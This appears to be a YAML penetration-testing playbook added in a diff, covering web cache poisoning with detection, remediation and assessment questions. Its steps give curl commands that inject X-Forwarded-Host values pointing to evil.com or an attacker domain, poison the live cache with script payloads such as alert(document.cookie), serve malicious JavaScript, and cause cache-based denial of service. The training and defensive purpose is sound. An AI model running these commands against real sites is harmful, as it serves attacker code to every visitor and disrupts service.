@@ -1,0 +1,188 @@
+# Category: Web Application Security - Web Cache Poisoning
+name: "Web Cache Poisoning Testing"
+id: "web-cache-poison-001"
+category: "web_application"
+subcategory: "cache_attacks"
+difficulty: "advanced"
+estimated_time: "60"
+
+tags:
+  - web-application
+  - cache-poisoning
+  - http-headers
+  - cdn
+  - varnish
+  - cloudflare
+  - web-security
+  - owasp
+  - burp-suite
+  - unkeyed-headers
+  - host-header
+  - x-forwarded-host
+  - dos
+  - mitre-t1190
+  - pentest
+  - red-team
+
+description: |
+  Detect and exploit web cache poisoning vulnerabilities where unkeyed HTTP
+  request headers or parameters cause malicious responses to be cached and
+  served to other users. Covers unkeyed header injection, fat GET attacks,
+  and parameter cloaking techniques.
+
+learning_objectives:
+  - Identify cache keys and unkeyed inputs in CDN and reverse proxy configurations
+  - Poison web caches using Host header and X-Forwarded-Host manipulation
+  - Exploit cache poisoning for XSS delivery to all users
+  - Detect and remediate cache key misconfigurations
+
+tools:
+  - "burp_suite"
+  - "param_miner"
+  - "curl"
+  - "python3"
+
+prerequisites:
+  - "Burp Suite with Param Miner extension installed"
+  - "Target application using CDN or reverse proxy caching"
+  - "Understanding of HTTP caching headers"
+  - "Written authorization from target owner"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify caching behavior and cache keys"
+    commands:
+      - "# Check for caching headers"
+      - "curl -sI 'http://[target_url]/' | grep -iE 'cache|age|x-cache|cf-cache|via|etag|vary'"
+      - "# Send two identical requests — second should return cache hit"
+      - "curl -sI 'http://[target_url]/static/main.js' | grep -i 'x-cache\\|age\\|cf-cache-status'"
+      - "curl -sI 'http://[target_url]/static/main.js' | grep -i 'x-cache\\|age\\|cf-cache-status'"
+      - "# Check Vary header — shows what IS in cache key"
+      - "curl -sI 'http://[target_url]/' | grep -i 'vary'"
+      - "# Cache-Control directives"
+      - "curl -sI 'http://[target_url]/' | grep -i 'cache-control'"
+    expected_output: "Cache hit/miss indicators, Vary header contents, and cache TTL"
+    detection: "Multiple requests to same endpoint from single IP in rapid succession"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Discover unkeyed headers with Param Miner"
+    commands:
+      - "# In Burp Suite — right-click request > Extensions > Param Miner > Guess headers"
+      - "# Param Miner will fuzz HTTP headers not included in cache key"
+      - "# Manual testing — inject tracking header and check if response changes"
+      - "curl -s 'http://[target_url]/' -H 'X-Forwarded-Host: evil.com' | grep -i 'evil.com'"
+      - "curl -s 'http://[target_url]/' -H 'X-Host: evil.com' | grep -i 'evil.com'"
+      - "curl -s 'http://[target_url]/' -H 'X-Forwarded-Server: evil.com' | grep -i 'evil.com'"
+      - "curl -s 'http://[target_url]/' -H 'X-Original-URL: /admin' | grep -i 'admin'"
+      - "# Check if response reflects header value (JS src, redirect URL, etc.)"
+      - "curl -s 'http://[target_url]/' -H 'X-Forwarded-Host: canary.example.com' | grep 'canary'"
+    expected_output: "Headers whose values are reflected in response but not part of cache key"
+    detection: "Unusual HTTP headers in web server access logs"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Host header cache poisoning for XSS"
+    commands:
+      - "# If X-Forwarded-Host reflected in script src or link href"
+      - "curl -s 'http://[target_url]/' -H 'X-Forwarded-Host: [attacker_domain]' | grep -i 'script\\|src\\|href' | head -10"
+      - "# Add cache-buster to avoid polluting live cache during testing"
+      - "curl -s 'http://[target_url]/?cb=[random_value]' -H 'X-Forwarded-Host: [attacker_domain]' | grep -i 'script'"
+      - "# If reflected — poison the actual cache (remove cache buster)"
+      - "curl -s 'http://[target_url]/' -H 'X-Forwarded-Host: [attacker_domain]' -H 'Cache-Control: no-cache'"
+      - "# Verify victim would load attacker JS"
+      - "curl -s 'http://[target_url]/' | grep '[attacker_domain]'"
+      - "# Serve malicious JS at attacker domain path"
+      - "python3 -m http.server 80 --directory /tmp/malicious_js"
+    expected_output: "Poisoned cache serving pages that load attacker-controlled JavaScript to all users"
+    detection: "CDN logs showing injected host header; JS load from unexpected domain in CSP reports"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Parameter-based cache poisoning (fat GET / unkeyed params)"
+    commands:
+      - "# Fat GET — body parameters ignored in cache key"
+      - "curl -s -X GET 'http://[target_url]/api/data' -d 'param=value' | head -20"
+      - "# If body reflected — poison cache with body param"
+      - "curl -s -X GET 'http://[target_url]/api/data' --data 'utm_content=<script>alert(1)</script>'"
+      - "# Unkeyed query parameter"
+      - "curl -s 'http://[target_url]/?utm_source=[test_value]' | grep '[test_value]'"
+      - "# If reflected and unkeyed — poison"
+      - "curl -s 'http://[target_url]/?utm_source=</script><script>alert(document.cookie)</script>'"
+      - "# Verify poison persists"
+      - "curl -s 'http://[target_url]/' | grep 'alert'"
+    expected_output: "Unkeyed parameter value reflected in cached response served to all visitors"
+    detection: "Query parameters with HTML/JS content in CDN access logs"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Cache poisoning DoS via malformed headers"
+    commands:
+      - "# Poison cache with response that causes error for all users"
+      - "curl -s 'http://[target_url]/' -H 'X-Forwarded-Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[OVERFLOW]' -H 'Cache-Control: no-cache'"
+      - "# HTTP method override cache poisoning"
+      - "curl -s 'http://[target_url]/' -H 'X-HTTP-Method-Override: POST' | head -5"
+      - "# Port-based cache poisoning"
+      - "curl -s 'http://[target_url]/' -H 'Host: [target_domain]:1337' | grep '1337'"
+    expected_output: "Cache poisoned with error or redirect response served to all subsequent users"
+    detection: "CDN error rate spike; unusual Host header values in cache logs"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A05:2021"
+    description: "Security Misconfiguration — cache misconfiguration"
+  - standard: "OWASP ASVS v4.0"
+    control: "13.1.3"
+    description: "HTTP security headers prevent cache poisoning"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent web application attacks"
+
+detection:
+  network_indicators:
+    - "Injected Host or X-Forwarded-Host headers in CDN access logs"
+    - "Requests with unusual HTTP headers not matching normal user agents"
+    - "External JS domain suddenly appearing in page source from CDN cache"
+  log_indicators:
+    - "CDN logs: X-Forwarded-Host containing attacker-controlled domain"
+    - "CSP violation reports: script loaded from unexpected domain"
+    - "Web server logs: Fat GET requests with body containing script content"
+  endpoint_indicators:
+    - "Cached page source containing attacker JS URL"
+    - "Sudden increase in JavaScript errors for all users"
+
+remediation:
+  immediate:
+    - "Purge all CDN/cache entries after discovering poisoning"
+    - "Configure cache to include Host header in cache key"
+    - "Normalize or reject X-Forwarded-Host headers at origin"
+  long_term:
+    - "Implement strict cache key configuration — only cache safe, keyed responses"
+    - "Add all unkeyed headers to cache key or strip them at proxy"
+    - "Deploy Content Security Policy to limit impact of reflected XSS via cache"
+    - "Regular web application penetration testing including cache poisoning"
+
+variables:
+  target_url: "http://target.example.com"
+  target_domain: "target.example.com"
+  attacker_domain: "attacker.example.com"
+  random_value: "cb12345"
+
+assessment_questions:
+  - "What is a cache key and what headers are typically included in it?"
+  - "How does an unkeyed header enable web cache poisoning?"
+  - "Why is the Vary header important in understanding cache key composition?"
+  - "How does cache poisoning differ from a traditional XSS attack in impact?"
+  - "What tool automates discovery of unkeyed inputs in Burp Suite?"
+
+references:
+  - url: "https://portswigger.net/web-security/web-cache-poisoning"
+    title: "PortSwigger Web Cache Poisoning"
+  - url: "https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943"
+    title: "Param Miner Burp Extension"
+  - url: "https://owasp.org/www-community/attacks/Cache_Poisoning"
+    title: "OWASP Cache Poisoning"
